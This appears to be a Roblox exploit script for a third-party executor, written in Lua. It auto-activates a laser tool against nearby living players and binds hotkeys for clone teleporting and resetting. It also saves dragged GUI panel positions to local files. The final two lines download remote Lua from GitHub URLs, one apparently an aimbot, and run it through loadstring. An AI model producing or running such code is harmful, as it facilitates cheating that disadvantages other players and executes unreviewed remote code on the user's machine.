local H,U,G,P=game:GetService("HttpService"),game:GetService("UserInputService"),game:GetService("CoreGui"),game:GetService("Players").LocalPlayer
local F,s="M_P.json",{}
if isfile and isfile(F) then pcall(function() s=H:JSONDecode(readfile(F)) end) end
_G.StickyRememberPanel=function(f,k)
if typeof(f)~="Instance" or not f:IsA("GuiObject") or type(k)~="string" then return end
if s[k] then f.Position=UDim2.new(s[k][1] or 0,s[k][2],s[k][3] or 0,s[k][4]) end
f:GetPropertyChangedSignal("Position"):Connect(function()
if not f.Parent then return end local p=f.Position
s[k]={p.X.Scale,p.X.Offset,p.Y.Scale,p.Y.Offset}
if writefile then writefile(F,H:JSONEncode(s)) end end) end
local function hk(f,k) _G.StickyRememberPanel(f,"M_"..k)
f.InputBegan:Connect(function(i)
if i.UserInputType==Enum.UserInputType.MouseButton1 then
local dS,sP,d=i.Position,f.Position,true local c1,c2
c1=U.InputChanged:Connect(function(m)
if d and m.UserInputType==Enum.UserInputType.MouseMovement then
local delta=m.Position-dS f.Position=UDim2.new(sP.X.Scale,sP.X.Offset+delta.X,sP.Y.Scale,sP.Y.Offset+delta.Y)
end end)
c2=U.InputEnded:Connect(function(e) if e.UserInputType==Enum.UserInputType.MouseButton1 then d=false c1:Disconnect() c2:Disconnect() end end)
end end) end
local function wt(c)
c.ChildAdded:Connect(function(s) if s:IsA("ScreenGui") then s.ChildAdded:Connect(function(g) if g:IsA("GuiObject") then hk(g,g.Name) end end) elseif s:IsA("GuiObject") then hk(s,s.Name) end end)
end
task.spawn(wt,P:WaitForChild("PlayerGui")) task.spawn(wt,G)
local function getClosest()
local b,bD=nil,math.huge
for _,p in ipairs(game:GetService("Players"):GetPlayers()) do
if p~=P and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and P.Character and P.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChildOfClass("Humanoid") and p.Character:FindFirstChildOfClass("Humanoid").Health>0 then
local d=(p.Character.HumanoidRootPart.Position-P.Character.HumanoidRootPart.Position).Magnitude
if d<bD then b,bD=p,d end end end return b
end
task.spawn(function()
while task.wait() do local tool=P.Character and P.Character:FindFirstChildWhichIsA("Tool")
if not (tool and tool.Name:lower():find("laser")) and P:FindFirstChild("Backpack") then
tool=P.Backpack:FindFirstChildWhichIsA("Tool") if tool and not tool.Name:lower():find("laser") then tool=nil end end
if tool and getClosest() then tool:Activate() end end end)
U.InputBegan:Connect(function(i,g)
if g then return end local c=P.Character
if i.KeyCode==Enum.KeyCode.R then
if _G.StickyDoClone then _G.StickyDoClone() elseif type(doClone)=="function" then doClone() end task.wait(0.5)
local cl=workspace:FindFirstChild(P.UserId.."_Clone")
if c and cl and c:FindFirstChild("HumanoidRootPart") and cl:FindFirstChild("HumanoidRootPart") then c.HumanoidRootPart.CFrame=cl.HumanoidRootPart.CFrame end
elseif i.KeyCode==Enum.KeyCode.B then if type(_G.StickyDropBrainrot)=="function" then _G.StickyDropBrainrot() end
elseif i.KeyCode==Enum.KeyCode.F then if _G.StickyInstantReset then _G.StickyInstantReset() elseif c and c:FindFirstChild("Humanoid") then c.Humanoid.Health=0 end
end end)
local function stopMap(v)
if v:IsA("Animator") or v:IsA("AnimationController") then pcall(function() for _,t in ipairs(v:GetPlayingAnimationTracks()) do t:Stop(0) end end) v.DescendantAdded:Connect(function(t) if t:IsA("AnimationTrack") then task.defer(function() t:Stop(0) end) end end) end
if v:IsA("ParticleEmitter") or v:IsA("Sparkles") or v:IsA("Fire") then v.Enabled=false end
if v:IsA("Tween") then pcall(v.Cancel,v) end end
local function scanMap(r)
for _,v in ipairs(r:GetDescendants()) do if not v:FindFirstAncestorOfClass("Model") or not game:GetService("Players"):GetPlayerFromCharacter(v:FindFirstAncestorOfClass("Model")) then stopMap(v) end end
r.DescendantAdded:Connect(function(v) if not v:FindFirstAncestorOfClass("Model") or not game:GetService("Players"):GetPlayerFromCharacter(v:FindFirstAncestorOfClass("Model")) then stopMap(v) end end) end
task.spawn(function() local p=workspace:WaitForChild("Plots",10) if p then scanMap(p) end end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rblx-api/loader/main/qhhqh.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Aimbot-Cap/refs/heads/main/Script.lua"))()